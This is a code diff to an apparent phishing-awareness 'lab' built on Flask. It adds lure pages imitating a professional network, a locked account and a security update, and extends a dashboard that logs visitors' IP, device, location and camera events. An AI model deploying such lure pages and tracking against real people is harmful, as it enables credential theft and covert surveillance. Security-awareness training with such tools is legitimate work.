@@ -137,6 +137,7 @@ def gerar_relatorio():
     total_camera = len([e for e in eventos if e.get("tipo") == "camera"])
     total_localizacao = len([e for e in eventos if e.get("tipo") == "localizacao"])
     total_email = len([e for e in eventos if e.get("tipo") == "email"])
+    total_template = len([e for e in eventos if e.get("tipo") == "template"])
 
     tempo_medio, tempo_minimo, tempo_maximo = calcular_tempos(eventos)
 
@@ -153,6 +154,7 @@ def gerar_relatorio():
         f.write(f"Eventos de câmera: {total_camera}\n")
         f.write(f"Eventos de localização: {total_localizacao}\n")
         f.write(f"Eventos de e-mail/conta: {total_email}\n")
+        f.write(f"Eventos de templates: {total_template}\n")
         f.write(f"Fotos salvas: {len(fotos)}\n")
         f.write(f"Tempo médio de resposta: {tempo_medio}s\n")
         f.write(f"Menor tempo de resposta: {tempo_minimo}s\n")
@@ -188,7 +190,10 @@ def menu():
     print("4) 🧾 Gerar relatório do lab")
     print("5) 🧹 Limpar evidências locais")
     print("6) 📧 Simulação de e-mail/conta")
-    print("7) 🛑 Sair")
+    print("7) 💼 Template rede profissional")
+    print("8) 🔒 Template conta bloqueada")
+    print("9) 🛡️ Template atualização de segurança")
+    print("10) 🛑 Sair")
 
     return input(f"\n{BLUE}Digite a opção: {RESET}")
 
@@ -206,6 +211,21 @@ def index():
 @app.route("/email")
 def email():
     return send_file(os.path.join(TEMPLATES_DIR, "email-check", "index.html"))
+
+
+@app.route("/linkedin")
+def linkedin():
+    return send_file(os.path.join(TEMPLATES_DIR, "linkedin", "index.html"))
+
+
+@app.route("/conta-bloqueada")
+def conta_bloqueada():
+    return send_file(os.path.join(TEMPLATES_DIR, "conta-bloqueada", "index.html"))
+
+
+@app.route("/atualizacao-seguranca")
+def atualizacao_seguranca():
+    return send_file(os.path.join(TEMPLATES_DIR, "atualizacao-seguranca", "index.html"))
 
 
 @app.route("/awareness")
@@ -333,6 +353,7 @@ def dashboard():
     total_camera = len([e for e in eventos if e.get("tipo") == "camera"])
     total_localizacao = len([e for e in eventos if e.get("tipo") == "localizacao"])
     total_email = len([e for e in eventos if e.get("tipo") == "email"])
+    total_template = len([e for e in eventos if e.get("tipo") == "template"])
 
     tempo_medio, tempo_minimo, tempo_maximo = calcular_tempos(eventos)
 
@@ -341,12 +362,16 @@ def dashboard():
     for e in eventos[-30:][::-1]:
         maps = ""
         email_info = ""
+        template_info = ""
 
         if e.get("google_maps") not in [None, "N/A"]:
             maps = f"<a href='{e.get('google_maps')}' target='_blank'>🌍 Google Maps</a>"
 
         if e.get("email_domain") not in [None, "N/A"]:
             email_info = f"<span>📧 {e.get('email_domain')}</span>"
+
+        if e.get("template") not in [None, "N/A"]:
+            template_info = f"<span>🎯 {e.get('template')}</span>"
 
         tempo = e.get("tempo_resposta")
         tempo_formatado = f"{round(tempo / 1000, 2)}s" if isinstance(tempo, (int, float)) else "N/A"
@@ -358,7 +383,7 @@ def dashboard():
             <td>{e.get('status')}</td>
             <td>{e.get('ip')}</td>
             <td>{tempo_formatado}</td>
-            <td>{maps} {email_info}</td>
+            <td>{maps} {email_info} {template_info}</td>
         </tr>
         """
 
@@ -493,6 +518,7 @@ canvas {{
         <div class="card"><h2>{total_camera}</h2><p>Câmera</p></div>
         <div class="card"><h2>{total_localizacao}</h2><p>Localização</p></div>
         <div class="card"><h2>{total_email}</h2><p>E-mail</p></div>
+        <div class="card"><h2>{total_template}</h2><p>Templates</p></div>
         <div class="card"><h2>{tempo_medio}s</h2><p>Tempo médio</p></div>
         <div class="card"><h2>{tempo_minimo}s</h2><p>Menor tempo</p></div>
         <div class="card"><h2>{tempo_maximo}s</h2><p>Maior tempo</p></div>
@@ -537,12 +563,12 @@ const ctx = document.getElementById('grafico');
 new Chart(ctx, {{
     type: 'bar',
     data: {{
-        labels: ['Câmera', 'Localização', 'E-mail'],
+        labels: ['Câmera', 'Localização', 'E-mail', 'Templates'],
         datasets: [{{
             label: 'Eventos',
-            data: [{total_camera}, {total_localizacao}, {total_email}],
-            backgroundColor: ['#38bdf8', '#ef4444', '#38bdf8'],
-            borderColor: ['#93c5fd', '#fca5a5', '#93c5fd'],
+            data: [{total_camera}, {total_localizacao}, {total_email}, {total_template}],
+            backgroundColor: ['#38bdf8', '#ef4444', '#38bdf8', '#f59e0b'],
+            borderColor: ['#93c5fd', '#fca5a5', '#93c5fd', '#fbbf24'],
             borderWidth: 1
         }}]
     }},
@@ -584,6 +610,7 @@ def evento():
         "tipo": tipo,
         "acao": data.get("acao", "N/A"),
         "status": data.get("status", "N/A"),
+        "template": data.get("template", "N/A"),
         "tempo_resposta": data.get("tempo_resposta", "N/A"),
         "user_agent": data.get("userAgent", "N/A"),
         "platform": data.get("platform", "N/A"),
@@ -666,6 +693,21 @@ if __name__ == "__main__":
             break
 
         elif escolha == "7":
+            print(f"\n{GREEN}[+] Template rede profissional disponível em:{RESET}")
+            print("    /linkedin\n")
+            break
+
+        elif escolha == "8":
+            print(f"\n{GREEN}[+] Template conta bloqueada disponível em:{RESET}")
+            print("    /conta-bloqueada\n")
+            break
+
+        elif escolha == "9":
+            print(f"\n{GREEN}[+] Template atualização de segurança disponível em:{RESET}")
+            print("    /atualizacao-seguranca\n")
+            break
+
+        elif escolha == "10":
             print(f"\n{YELLOW}[+] Saindo...{RESET}\n")
             exit()
 
